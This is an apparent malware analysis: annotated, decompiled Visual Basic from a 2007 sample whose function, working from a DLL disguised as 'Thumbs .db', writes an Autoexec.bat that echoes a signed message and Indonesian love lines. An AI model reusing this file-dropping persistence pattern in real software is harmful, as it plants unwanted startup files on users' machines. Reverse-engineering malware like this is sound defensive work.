' Drops Autoexec.bat
Public Function funct9() '404A00 ' WARNING: The renamings made here are pure speculation
  'Data Table: 401838
  ' Variable declaration
  Dim splitted_path As Variant
  Dim autoexec_path2 As String
  Dim autoexec_s1 As String
  Dim autoexec_s2 As String
  Dim autoexec_s3 As String

  loc_4048B2: On Error Resume Next ' Ignore errors and continue

  loc_4048BF: dll_path = funct1(0) ' Get DLL current path
  ' InStr([ start ], string1, string2, [ compare ])
  ' Get the path without specifying the drive.
  ' Examples: C:\Windows\System32 -> \Windows\System32
  '              C:\AppData\MyApp -> \AppData\MyApp
  loc_4048E2: splitted_path = InStr(1, dll_path, ":", 0) ' Split path
  loc_4048EE: Thumbs   .db.address_80000269 ' Call the DLL
  loc_4048FF: autoexec_path = dll_path & "Autoexec.bat" 'Variant

  ' If CALL_RESULT NOT NULL -> return autoexec_path
  loc_404924: If (Thumbs   .db.address_80000285 <> vbNullString) Then
  loc_404929:   funct9 = autoexec_path
  loc_40492F: End If

  loc_404939: autoexec_path2 = CStr(autoexec_path)
              'Call 2 DLL functions
  loc_40493D: Thumbs   .db.address_80000244
  loc_40494A: Thumbs   .db.address_80000211

  ' Drop Autoexec.bat in the same folder as the DLL
  loc_40495D: Open CStr(autoexec_path) For Output As 1 Len = &HFF
  loc_404982: autoexec_s1 = "@Echo Off" & vbCrLf & "Echo 81u3f4nt45y - 24.01.2007" & vbCrLf & "Echo Don't kill me, i'm just send message from your computer"
  loc_40499E: autoexec_s2 = autoexec_s1 & vbCrLf & "Echo Terima kasih telah menemaniku walaupun hanya sesaat, tapi bagiku sangat berarti" & vbCrLf & "Echo Maafkan jika kebahagiaan yang kuminta adalah teman sepanjang hidupku"
  loc_4049BA: autoexec_s3 = autoexec_s2 & vbCrLf & "Echo Seharusnya aku mengerti bahwa keberadaanku bukanlah disisimu, hanyalah lamunan dalam sesal" & vbCrLf & "Echo Untuk kekasih yang tak kan pernah kumiliki 3r1k1m0"
  loc_4049CD: Print 1, autoexec_s3 & vbCrLf & "pause"
  loc_4049F6: Close 1
  loc_4049FA: funct9 = autoexec_path ' Return autoexec_path
End Function
